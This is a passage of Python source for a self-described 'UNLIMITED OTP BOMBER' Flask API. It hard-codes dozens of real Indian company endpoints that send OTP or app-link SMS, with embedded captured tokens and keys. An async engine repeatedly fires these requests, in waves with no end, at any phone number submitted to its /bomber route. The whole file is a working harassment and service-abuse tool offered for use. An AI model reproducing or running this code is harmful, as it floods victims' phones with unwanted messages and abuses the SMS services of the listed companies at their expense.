            "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobileoremail":"{p}","name":"markluther"}}'
        },
        {
            "name": "Frotels OTP",
            "url": "https://www.frotels.com/appsendsms.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"mobno={p}"
        },
        {
            "name": "Gapoon OTP",
            "url": "https://www.gapoon.com/userSignup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile":"{p}","email":"noreply@gmail.com","name":"LexLuthor"}}'
        },
        {
            "name": "Porter OTP",
            "url": "https://porter.in/restservice/send_app_link_sms",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","referrer_string":"","brand":"porter"}}'
        },
        {
            "name": "Cityflo OTP",
            "url": "https://cityflo.com/website-app-download-link-sms/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobile_number":"{p}"}}'
        },
        {
            "name": "NNNOW OTP",
            "url": "https://api.nnnow.com/d/api/appDownloadLink",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"mobileNumber":"{p}"}}'
        },
        {
            "name": "AJIO OTP",
            "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"firstName":"xxps","login":"wiqpdl223@wqew.com","password":"QASpw@1s","genderType":"Male","mobileNumber":"{p}","requestType":"SENDOTP"}}'
        },
        {
            "name": "HappyEasyGo OTP",
            "url": lambda p: f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{p}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Unacademy OTP",
            "url": "https://unacademy.com/api/v1/user/get_app_link/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}"}}'
        },
        {
            "name": "Treebo OTP",
            "url": "https://www.treebo.com/api/v2/auth/login/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone_number":"{p}"}}'
        },
        {
            "name": "Airtel OTP",
            "url": "https://www.airtel.in/referral-api/core/notify",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"messageId=map&rtn={p}"
        },
        {
            "name": "MylesCars OTP",
            "url": "https://www.mylescars.com/usermanagements/chkContact",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"contactNo":"{p}"}}'
        },
        {
            "name": "Grofers OTP",
            "url": "https://grofers.com/v2/accounts/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda p: f"user_phone={p}"
        },
        {
            "name": "Dream11 OTP",
            "url": "https://api.dream11.com/sendsmslink",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"siteId":"1","mobileNum":"{p}","appType":"androidfull"}}'
        },
        {
            "name": "Cashify OTP",
            "url": "https://www.cashify.in/api/cu01/v1/app-link",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"mn={p}"
        },
        {
            "name": "Paytm OTP",
            "url": "https://commonfront.paytm.com/v4/api/sendsms",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda p: f'{{"phone":"{p}","guid":"2952fa812660c58dc160ca6c9894221d"}}'
        },
        {
            "name": "KFC India OTP",
            "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
            "method": "POST",
            "headers": {
                "Referer": "https://online.kfc.co.in/login",
                "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
            },
            "data": lambda p: f'{{"AuthorizedFor":"3","phoneNumber":"{p}","Resend":"false"}}'
        },
        {
            "name": "IndiaLends OTP",
            "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
            "method": "POST",
            "headers": {"Referer": "https://indialends.com/personal-loan"},
            "data": lambda p: f"aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={p}&lj80gertdfg=0"
        },
        {
            "name": "Flipkart OTP",
            "url": "https://www.flipkart.com/api/5/user/otp/generate",
            "method": "POST",
            "headers": {
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "data": lambda p: f"loginId=+91{p}"
        },
        {
            "name": "RedBus OTP",
            "url": "https://m.redbus.in/api/getOtp",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"number={p}&cc=91&whatsAppOpted=false"
        },
        {
            "name": "Hotstar OTP",
            "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
            "method": "PUT",
            "headers": {
                "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-country-code": "IN",
                "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1"
            },
            "data": lambda p: f'{{"phone_number":"{p}","country_prefix":"91"}}'
        },
        {
            "name": "AltBalaji OTP",
            "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
            "method": "POST",
            "headers": {
                "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
                "Content-Type": "application/json"
            },
            "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web","exp":1601043289127}}'
        },
        {
            "name": "Voot OTP",
            "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda p: f'{{"type":"mobile","mobile":"{p}","countryCode":"+91"}}'
        },
        {
            "name": "SonyLIV OTP",
            "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
            "method": "POST",
            "headers": {
                "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
                "content-type": "application/json"
            },
            "data": lambda p: f'{{"channelPartnerID":"MSMIND","mobileNumber":"{p}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}}'
        },
        {
            "name": "Zee5 OTP",
            "url": "https://b2bapi.zee5.com/device/sendotp_v1.php",
            "method": "GET",
            "headers": {},
            "data": lambda p: f"phoneno={p}"
        }
    ]

    # Combine ALL APIS
    all_apis = []
    all_apis.extend(api_configs)
    all_apis.extend(more_apis)
    
    # Remove duplicates by name (keep first occurrence)
    seen = set()
    unique_apis = []
    for api in all_apis:
        name = api.get("name", "Unknown")
        if name not in seen:
            seen.add(name)
            unique_apis.append(api)
    
    return unique_apis

# ==================================================================
# ðŸš€ UNLIMITED BOMBER ENGINE
# ==================================================================
class UnlimitedBomber:
    def __init__(self):
        self.all_apis = get_all_apis()
        self.total_apis = len(self.all_apis)
        self.timeout = aiohttp.ClientTimeout(total=3, connect=2)
        self.semaphore = asyncio.Semaphore(100)
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        self.is_running = False
        self.active_bombings = {}
        self.start_time = None
        
    async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str):
        async with self.semaphore:
            try:
                url = api.get("url")
                if callable(url):
                    url = url(phone)
                    
                if not url:
                    return False
                
                method = api.get("method", "POST")
                headers = api.get("headers", {}).copy()
                data = api.get("data")
                
                if callable(data):
                    data = data(phone)
                elif data is None:
                    data = {}
                
                for k, v in headers.items():
                    if callable(v):
                        if k.lower() == "content-length" and data:
                            headers[k] = str(len(str(data)) if not isinstance(data, dict) else len(json.dumps(data)))
                        else:
                            headers[k] = v(data) if callable(v) else v
                
                kwargs = {
                    "headers": headers,
                    "timeout": self.timeout,
                    "ssl": False
                }
                
                if method.upper() == "GET":
                    if data and isinstance(data, dict):
                        kwargs["params"] = data
                    elif data and isinstance(data, str):
                        kwargs["params"] = data
                else:
                    if data:
                        if isinstance(data, dict):
                            kwargs["json"] = data
                        else:
                            kwargs["data"] = data
                
                async with session.request(method, url, **kwargs) as response:
                    if 200 <= response.status < 300:
                        with self.lock:
                            self.success_count += 1
                            self.total_requests += 1
                        return True
                    return False
                    
            except Exception:
                with self.lock:
                    self.fail_count += 1
                    self.total_requests += 1
                return False

    async def continuous_bomb(self, phone: str, stop_event: asyncio.Event):
        wave = 0
        
        async with aiohttp.ClientSession() as session:
            tasks = [self.make_request(session, api, phone) for api in self.all_apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            while not stop_event.is_set():
                wave += 1
                batch_size = min(100, len(self.all_apis))
                selected_apis = random.sample(self.all_apis, batch_size)
                
                tasks = []
                for api in selected_apis:
                    api_copy = api.copy()
                    if "headers" in api_copy:
                        api_copy["headers"] = api_copy["headers"].copy()
                        api_copy["headers"]["X-Wave"] = str(wave)
                        api_copy["headers"]["X-Timestamp"] = str(int(time.time() * 1000))
                    
                    tasks.append(self.make_request(session, api_copy, phone))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.02)

    def start_bombing(self, phone: str) -> dict:
        phone_key = f"bomb_{phone}"
        
        if phone_key in self.active_bombings and self.active_bombings[phone_key]["running"]:
            return {
                "status": "already_running",
                "message": f"ðŸš€ Bombing already active for {phone}"
            }
        
        stop_event = asyncio.Event()
        
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.is_running = True
        self.start_time = time.time()
        
        def run_bomb_loop():
            asyncio.set_event_loop(asyncio.new_event_loop())
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.continuous_bomb(phone, stop_event))
        
        import threading
        bomb_thread = threading.Thread(target=run_bomb_loop, daemon=True)
        bomb_thread.start()
        
        self.active_bombings[phone_key] = {
            "running": True,
            "stop_event": stop_event,
            "thread": bomb_thread,
            "start_time": time.time()
        }
        
        return {
            "status": "started",
            "message": f"ðŸ”¥ UNLIMITED BOMBING STARTED for {phone}",
            "total_apis": self.total_apis,
            "mode": "UNLIMITED - NEVER STOPS"
        }

    def stop_bombing(self, phone: str) -> dict:
        phone_key = f"bomb_{phone}"
        
        if phone_key not in self.active_bombings or not self.active_bombings[phone_key]["running"]:
            return {"status": "not_running", "message": f"No active bombing for {phone}"}
        
        self.active_bombings[phone_key]["stop_event"].set()
        self.active_bombings[phone_key]["running"] = False
        self.is_running = False
        
        duration = round(time.time() - self.active_bombings[phone_key]["start_time"], 2)
        
        return {
            "status": "stopped",
            "message": f"ðŸ›‘ STOPPED bombing for {phone}",
            "stats": {
                "success": self.success_count,
                "failed": self.fail_count,
                "total": self.total_requests,
                "duration_seconds": duration,
                "requests_per_second": round(self.total_requests / duration, 2) if duration > 0 else 0
            }
        }

    def get_stats(self, phone: str = None) -> dict:
        duration = round(time.time() - (self.start_time or time.time()), 2)
        
        if phone:
            phone_key = f"bomb_{phone}"
            if phone_key in self.active_bombings:
                return {
                    "phone": phone,
                    "running": self.active_bombings[phone_key]["running"],
                    "duration_seconds": duration,
                    "success": self.success_count,
                    "failed": self.fail_count,
                    "total": self.total_requests,
                    "apis": self.total_apis
                }
            return {"phone": phone, "running": False}
        
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "total": self.total_requests,
            "duration_seconds": duration,
            "apis": self.total_apis,
            "active_bombings": sum(1 for b in self.active_bombings.values() if b["running"])
        }

    def stop_all(self) -> dict:
        stopped = []
        for key, bomb in list(self.active_bombings.items()):
            if bomb["running"]:
                bomb["stop_event"].set()
                bomb["running"] = False
                phone = key.replace("bomb_", "")
                stopped.append(phone)
        
        self.is_running = False
        return {
            "status": "stopped_all",
            "stopped_count": len(stopped),
            "phones": stopped
        }

# ==================================================================
# ðŸŒ FLASK API SERVER
# ==================================================================
bomber = UnlimitedBomber()

@app.route('/')
def home():
    return jsonify({
        "service": "ðŸ”¥ UNLIMITED OTP BOMBER API @ProviderBotz",
        "status": "ðŸš€ ONLINE",
        "total_apis": bomber.total_apis,
        "mode": "UNLIMITED - NEVER STOPS ☠️",
        "endpoints": {
            "/bomber?number=PHONE": "ðŸš€ START bombing",
            "/stop?number=PHONE": "ðŸ›‘ STOP bombing",
            "/stop_all": "ðŸ›‘ STOP ALL",
            "/status": "ðŸ“Š Check status",
            "/status?number=PHONE": "ðŸ“Š Check specific phone"
        }
    })

@app.route('/bomber')
def bomb():
    phone = request.args.get('number', '').strip()
    
    if not phone:
        return jsonify({"error": "Phone number required", "usage": "/bomber?number=9876543210"}), 400
    
    country_code, clean_phone = validate_phone(phone)
    if not clean_phone or len(clean_phone) != 10:
        return jsonify({"error": "Invalid phone number. Use 10-digit Indian number."}), 400
    
    result = bomber.start_bombing(clean_phone)
    return jsonify(result)

@app.route('/stop')
def stop():
    phone = request.args.get('number', '').strip()
    
    if not phone:
        return jsonify({"error": "Phone number required", "usage": "/stop?number=9876543210"}), 400
    
    country_code, clean_phone = validate_phone(phone)
    if not clean_phone:
        return jsonify({"error": "Invalid phone number"}), 400
    
    result = bomber.stop_bombing(clean_phone)
    return jsonify(result)

@app.route('/stop_all')
def stop_all():
    result = bomber.stop_all()
    return jsonify(result)

@app.route('/status')
def status():
    phone = request.args.get('number', '').strip()
    
    if phone:
        country_code, clean_phone = validate_phone(phone)
        if clean_phone:
            result = bomber.get_stats(clean_phone)
            return jsonify(result)
    
    return jsonify({
        "service": "UNLIMITED OTP BOMBER",
        "status": "ðŸš€ ONLINE",
        "total_apis": bomber.total_apis,
        "stats": bomber.get_stats()
    })

# ==================================================================
# ðŸš€ RUN SERVER
# ==================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘                                                                  â•‘
    â•‘   ðŸ”¥ UNLIMITED OTP BOMBER API v6.0                            â•‘
    â•‘   ðŸ“¦ Deployed on Render.com                                    â•‘
    â•‘                                                                  â•‘
    â•‘   ðŸ“¦ Total APIs: {}                                       â•‘
    â•‘   ðŸ”„ Mode: UNLIMITED - NEVER STOPS                          â•‘
    â•‘                                                                  â•‘
    â•‘   ðŸš€ Server: http://0.0.0.0:{}                            â•‘
    â•‘   ðŸ“¡ Start: /bomber?number=9876543210                        â•‘
    â•‘   ðŸ›‘ Stop: /stop?number=9876543210                           â•‘
    â•‘                                                                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """.format(bomber.total_apis, port))
    
    app.run(host='0.0.0.0', port=port, debug=False)